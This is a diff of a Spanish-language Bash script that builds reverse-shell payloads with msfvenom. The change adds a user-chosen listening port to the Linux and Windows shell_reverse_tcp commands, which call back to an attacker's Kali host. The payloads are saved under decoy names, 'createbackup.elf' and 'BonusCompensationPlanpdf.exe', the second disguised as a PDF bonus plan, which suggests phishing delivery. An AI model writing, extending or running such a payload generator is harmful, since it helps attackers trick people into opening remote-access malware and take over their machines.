@@ -20,6 +20,14 @@ fi
 echo "IP seleccionada: $KALI_IP"
 echo "-----------------------"
 
+# Selección de puerto (default 443)
+read -p "Puerto a usar [443] (Enter para default): " LPORT
+LPORT="${LPORT:-443}"
+if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || (( LPORT < 1 || LPORT > 65535 )); then
+    echo "Puerto inválido: $LPORT (debe ser un número entre 1 y 65535)."
+    exit 1
+fi
+
 # Selección de OS
 echo "Elige el sistema operativo target:"
 echo "1. Linux (x64)"
@@ -29,12 +37,12 @@ read -p "Selección [1-2]: " OS_CHOICE
 case $OS_CHOICE in
     1)
         echo "Generando payload Linux..."
-        msfvenom -p linux/x64/shell_reverse_tcp LHOST="$KALI_IP" LPORT=443 -f elf > createbackup.elf
+        msfvenom -p linux/x64/shell_reverse_tcp LHOST="$KALI_IP" LPORT="$LPORT" -f elf > createbackup.elf
         echo "Archivo creado: createbackup.elf"
         ;;
     2)
         echo "Generando payload Windows..."
-        msfvenom -p windows/shell_reverse_tcp LHOST="$KALI_IP" LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+        msfvenom -p windows/shell_reverse_tcp LHOST="$KALI_IP" LPORT="$LPORT" -f exe > BonusCompensationPlanpdf.exe
         echo "Archivo creado: BonusCompensationPlanpdf.exe"
         ;;
     *)
